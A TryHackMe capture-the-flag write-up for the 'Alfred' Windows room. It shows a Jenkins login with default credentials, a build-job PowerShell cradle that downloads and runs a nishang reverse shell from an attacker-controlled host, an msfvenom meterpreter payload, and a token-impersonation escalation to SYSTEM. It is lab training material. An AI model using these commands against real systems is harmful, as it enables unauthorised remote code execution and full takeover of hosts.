# Alfred - TryHackMe Writeup

**OS:** Windows  
**Difficulty:** Easy  
**Topics:** Jenkins RCE, PowerShell Reverse Shell, msfvenom, Token Impersonation, Incognito

---

## Enumeration

```bash
nmap -Pn -sV <TARGET_IP>
```

Relevant ports:
- **80** - Static page (Alfred image)
- **8080** - Jenkins
- **3389** - RDP

---

## Foothold - Jenkins RCE via Build Job

### 1. Jenkins Access
Default credentials: `admin:admin`  
URL: `http://<TARGET_IP>:8080`

### 2. PowerShell Reverse Shell

Download [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and append this at the end of the file:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
```

Serve the file with a Python HTTP server:

```bash
python3 -m http.server 8000
```

In Jenkins: **New Item -> Freestyle Project -> Build -> Execute Windows batch command**:

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://<LHOST>:8000/Invoke-PowerShellTcp.ps1')
```

Start listener:

```bash
nc -lvnp <LPORT>
```

Run the build -> shell obtained as `alfred\bruce`.

### 3. User Flag

```text
C:\Users\bruce\Desktop\user.txt
```

---

## Shell Upgrade - Meterpreter via msfvenom

### 1. Generate payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  -a x86 --encoder x86/shikata_ga_nai \
  LHOST=<LHOST> LPORT=<LPORT2> \
  -f exe -o shell.exe
```

### 2. Download payload on target machine

Through a second Jenkins build job:

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<LHOST>:8000/shell.exe','shell.exe')"
```

### 3. Configure Metasploit handler

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT <LPORT2>
run
```

### 4. Execute payload

In Jenkins build job (or from PS shell):

```powershell
Start-Process "shell.exe"
```

-> Meterpreter session obtained.

---

## Privilege Escalation - Token Impersonation (Incognito)

### 1. Check privileges

```text
whoami /priv
```

Relevant enabled privileges:
- `SeDebugPrivilege`
- `SeImpersonatePrivilege`

### 2. Load Incognito

```text
load incognito
```

### 3. List available tokens

```text
list_tokens -g
```

Available token: `BUILTIN\Administrators`

### 4. Impersonate token

```text
impersonate_token "BUILTIN\Administrators"
getuid
```

> Token is impersonated, but effective permissions still depend on the primary process token - migration is needed.

### 5. Migrate into services.exe

```text
ps
migrate <PID_of_services.exe>
```

-> Shell as `NT AUTHORITY\SYSTEM`.

### 6. Root Flag

```text
C:\Windows\System32\config\root.txt
```

---

## Summary

| Step | Technique | Tool |
|------|-----------|------|
| Foothold | Jenkins default creds + Build Job RCE | nmap, Jenkins, nishang |
| Shell | PowerShell reverse shell via IEX download | Python HTTP server, nc |
| Upgrade | msfvenom exe + multi/handler | Metasploit |
| PrivEsc | SeImpersonatePrivilege -> Token Impersonation | Incognito, Meterpreter |
| Root | Migration into services.exe -> SYSTEM | Meterpreter migrate |

---

## OSCP Notes

- `SeImpersonatePrivilege` enabled = always test token impersonation first (Incognito or PrintSpoofer/RoguePotato on newer systems)
- Jenkins with default creds is a classic vector - always check non-standard web ports (8080, 8443, 9090)
- Migration into `services.exe` is required because Windows uses the process **Primary Token**, not the impersonated token, for access decisions
